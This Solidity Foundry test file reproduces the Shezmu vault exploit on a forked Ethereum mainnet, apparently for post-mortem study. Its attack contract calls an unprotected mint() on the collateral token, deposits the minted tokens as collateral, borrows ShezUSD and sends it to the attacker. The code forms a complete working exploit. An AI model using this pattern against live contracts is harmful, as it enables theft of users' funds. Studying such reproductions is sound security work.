// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.9M USD
// Attacker : https://etherscan.io/address/0xa3a64255484ad65158af0f9d96b5577f79901a1d
// Attack Contract : https://etherscan.io/address/0xEd4B3d468DEd53a322A8B8280B6f35aAE8bC499C
// Vulnerable Contract : https://etherscan.io/address/0x641249dB01d5C9a04d1A223765fFd15f95167924
// Attack Tx : https://etherscan.io/tx/0x39328ea4377a8887d3f6ce91b2f4c6b19a851e2fc5163e2f83bbc2fc136d0c71

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x641249dB01d5C9a04d1A223765fFd15f95167924#code

// @Analysis
// Post-mortem : https://medium.com/coinmonks/decoding-shezmus-4-9-million-exploit-10dc0266b25b
// Twitter Guy : https://x.com/shoucccc/status/1837228053862437244
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant SHEZMU_VAULT_PROXY = 0x75a04A1FeE9e6f26385ab1287B20ebdCbdabe478;
address constant COLLATERAL_TOKEN = 0x641249dB01d5C9a04d1A223765fFd15f95167924;
address constant SHEZ_USD = 0xD60EeA80C83779a8A5BFCDAc1F3323548e6BB62d;

contract Shezmu is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20794865 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = SHEZ_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        AttackContract attackContract = new AttackContract();
        attackContract.attack();
    }
}

contract AttackContract {
    address attacker;
    constructor() {
        attacker = msg.sender;
    }
    function attack() public {
        IShezmuCollateralToken(COLLATERAL_TOKEN).approve(SHEZMU_VAULT_PROXY, type(uint256).max);
        uint256 amount = type(uint128).max - 1;
        // Root cause: The Shezmu Vault collateral token contract mint() function 
        // lacks access control
        // anyone can mint any amount of collateral token
        IShezmuCollateralToken(COLLATERAL_TOKEN).mint(address(this), amount);

        IShezmuVault vault = IShezmuVault(SHEZMU_VAULT_PROXY);
        vault.addCollateral(amount);

        // This step will mint new ShezUSD to the borrower
        uint256 borrowAmount = 99999159998000000000000000000;
        vault.borrow(borrowAmount);

        IERC20 shezUSD = IERC20(SHEZ_USD);
        shezUSD.transfer(attacker, shezUSD.balanceOf(address(this)));
    }
}

interface IShezmuCollateralToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}

interface IShezmuVault {
    function addCollateral(uint256 _colAmount) external;
    function borrow(uint256 _amount) external;
}
